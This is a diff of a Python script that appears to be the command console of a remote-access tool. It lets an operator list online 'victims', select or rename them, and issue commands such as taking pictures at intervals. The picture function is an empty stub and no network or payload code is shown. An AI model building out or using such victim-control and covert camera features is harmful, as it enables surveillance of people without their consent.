@@ -87,6 +87,7 @@ class ChooseToAttack(object):
                     del self.selected_user[name]
 
                 del self.users_online[name]
+                self.refresh_sc = True
                 break
 
     def pick_victim(self):
@@ -106,11 +107,9 @@ class ChooseToAttack(object):
                             print(line, end='')
 
                     self.printing_anim = False
-                    # print('\n')
                 else:
                     print(ascii_logo, end='')
-                    # print('\n')
-                print('\n')
+
                 rename_desc = " - Type 'rename' to rename a victim!"
                 select_desc = " - Type the name of the victim you want to select!"
 
@@ -126,7 +125,6 @@ class ChooseToAttack(object):
                 self.input_thread = False
                 inp_thread = threading.Thread(target=self.get_input)
                 inp_thread.start()
-
             else:
                 continue
 
@@ -158,11 +156,12 @@ class ChooseToAttack(object):
                         self.refresh_sc = True
                     else:
                         print(f'\n ERROR: user [{name}] does not exist!')
-                        input(' Press ENTER to continue > ')
+                        input(' Press ENTER to continue > ')  # MAKE IT A FUNC --> pressEnter()
                         self.refresh_sc = True
                 else:
                     if user_input != '':
-                        print(f"\n Error: No user/command found named [{user_input}]")
+                        print(f"\n Error: No user found named [{user_input}]")
+                        input(' Press ENTER to continue > ')
 
                     self.refresh_sc = True
 
@@ -174,9 +173,12 @@ class ExecuteCMD(object):
         self.switch = True
         self.input_thread = True
         self.refresh_sc = True
+        self.printing_done = False
+        self.offline = False
+        self.real_name = list(self.victim_data.keys())[0]
 
         self.run_cmd = {
-            'take_pictures': ['Take (x) pictures every (y) seconds', self.take_pictures],
+            'take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
             'back': ['Go back to victim selection', self.back]}
 
     def pick_command(self):
@@ -186,32 +188,56 @@ class ExecuteCMD(object):
                 self.refresh_sc = False
                 clear_screen()
 
+                print(ascii_cmd)
+                print(f' Type the name of the command you want to use on [{self.real_name}]\n')
+                print(beautify(" command/description", '~'))
+                print('\n', end='')
+
                 for cmd in self.run_cmd:
-                    print(f"{cmd} = {self.run_cmd[cmd][0]}")
+                    print(f" {cmd} <cmd--desc> {self.run_cmd[cmd][0]}")
+
+                self.printing_done = True
 
                 if self.input_thread:
-                    self.thread = False
+                    self.input_thread = False
                     inp_thread = threading.Thread(target=self.get_input)
                     inp_thread.start()
 
-    def get_input(self):
+    def get_input(self):  # buggy
         while self.switch:
-            command = input("\n >>> ")
+            if self.printing_done:
+                command = input("\n CMD: ")
+                self.printing_done = False
 
-            if command in self.run_cmd:
-                output = self.run_cmd[command][1]()
-
-                if output == 'back':
+                if self.offline:
+                    print(f" [{self.real_name}] is offline!")
+                    input(' Press ENTER to go back to victim selection! > ')
                     self.switch = False
+                    self.refresh_sc = True
+                    break
 
-            self.clear_sc = True
-            time.sleep(1)
+                if command in self.run_cmd:
+                    output = self.run_cmd[command][1]()
+
+                    if output == 'back':
+                        self.switch = False
+                        break
+
+                self.refresh_sc = True
 
     def take_pictures(self):
         pass
 
     def back(self):
-        return 'back'
+        self.switch = False
+
+    def user_online(self):
+        # Thread checking selected_user dict from to_attack object
+        # to see if the user disconnected
+        while True:
+            if not to_attack.selected_user:
+                self.offline = True
+                break
 
 
 class ManageDB(object):
@@ -264,4 +290,6 @@ if __name__ == '__main__':
         to_attack.pick_victim()
 
         execute = ExecuteCMD(to_attack.selected_user)
+        online_thread = threading.Thread(target=execute.user_online)
+        online_thread.start()
         execute.pick_command()
